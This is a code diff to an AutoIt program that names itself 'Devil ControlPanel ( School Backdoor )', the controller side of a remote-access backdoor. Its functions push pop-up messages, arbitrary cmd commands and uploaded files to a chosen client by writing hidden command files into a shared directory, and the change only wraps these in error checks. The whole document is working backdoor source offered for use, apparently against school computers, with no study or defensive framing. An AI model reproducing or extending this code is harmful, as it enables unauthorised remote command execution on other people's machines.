@@ -2,7 +2,7 @@
 
  Devil ControlPanel ( School Backdoor )
  AutoIt Version: 3.3.14.2
- Version: Beta ( 18:55 8.09.2017)
+ Version: Beta 2 ( 17:09 11.09.2017)
 
 #ce ----------------------------------------------------------------------------
 
@@ -115,16 +115,18 @@ Func ShowMessageBox()
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
         Local $MessageBox_Text = InputBox("Devil ControlPanel", "Enter the text that will be displayed.", "", "", 270, 130)
-        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
-        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
-        FileWriteLine($Temp_DataFile, "[Data]")
-        FileWriteLine($Temp_DataFile, "Type=show_message")
-        FileWriteLine($Temp_DataFile, "Command=" & $MessageBox_Text)
-        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
-        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
-        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
-        FileClose($Temp_DataFile)
-        Sleep(1000) 
+        If Not @error Then
+            Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+            FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+            FileWriteLine($Temp_DataFile, "[Data]")
+            FileWriteLine($Temp_DataFile, "Type=show_message")
+            FileWriteLine($Temp_DataFile, "Command=" & $MessageBox_Text)
+            FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+            FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+            FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+            FileClose($Temp_DataFile)
+            Sleep(1000)
+        EndIf
     EndIf
 EndFunc
 
@@ -135,16 +137,18 @@ Func ExecuteToCMD()
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
         Local $CMD_Command = InputBox("Devil ControlPanel", "Enter the cmd command.", "", "", 270, 130)
-        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
-        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
-        FileWriteLine($Temp_DataFile, "[Data]")
-        FileWriteLine($Temp_DataFile, "Type=execute_command")
-        FileWriteLine($Temp_DataFile, "Command=" & $CMD_Command)
-        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
-        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
-        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
-        FileClose($Temp_DataFile)
-        Sleep(1000) 
+        If Not @error Then
+            Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+            FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+            FileWriteLine($Temp_DataFile, "[Data]")
+            FileWriteLine($Temp_DataFile, "Type=execute_command")
+            FileWriteLine($Temp_DataFile, "Command=" & $CMD_Command)
+            FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+            FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+            FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+            FileClose($Temp_DataFile)
+            Sleep(1000) 
+        EndIf
     EndIf
 EndFunc
 
@@ -174,18 +178,20 @@ Func LoadFile()
         MsgBox($MB_ICONERROR, "Devil Control Panel", "You must enter the client's id!")
     Else
         Local $File_To_Load = FileOpenDialog("Select the file, that must be uploaded!", "C:\", "All (*.*)" )
-        Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
-        Local $File_Name = _PathSplit($File_To_Load, -1, -1, -1, -1) ; Get file name
-        FileCopy($File_To_Load, $Server_Directory)
-        FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
-        FileWriteLine($Temp_DataFile, "[Data]")
-        FileWriteLine($Temp_DataFile, "Type=load_file")
-        FileWriteLine($Temp_DataFile, "Command=" & $File_Name[3] & $File_Name[4])
-        FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
-        FileDelete($Server_Directory & "\" & $ClientID & "_temp")
-        FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
-        FileClose($Temp_DataFile)
-        Sleep(1000) 
+        If Not @error Then
+            Local $Temp_DataFile = FileOpen($Server_Directory & "\" & $ClientID & "_temp", $FO_APPEND)
+            Local $File_Name = _PathSplit($File_To_Load, -1, -1, -1, -1) ; Get file name
+            FileCopy($File_To_Load, $Server_Directory)
+            FileSetAttrib($Server_Directory & "\" & $ClientID & "_temp", "+H")
+            FileWriteLine($Temp_DataFile, "[Data]")
+            FileWriteLine($Temp_DataFile, "Type=load_file")
+            FileWriteLine($Temp_DataFile, "Command=" & $File_Name[3] & $File_Name[4])
+            FileCopy($Server_Directory & "\" & $ClientID & "_temp", $Server_Directory & "\" & $ClientID, $FC_OVERWRITE)
+            FileDelete($Server_Directory & "\" & $ClientID & "_temp")
+            FileSetAttrib($Server_Directory & "\" & $ClientID, "+H")
+            FileClose($Temp_DataFile)
+            Sleep(1000)
+        EndIf
     EndIf
 EndFunc
 
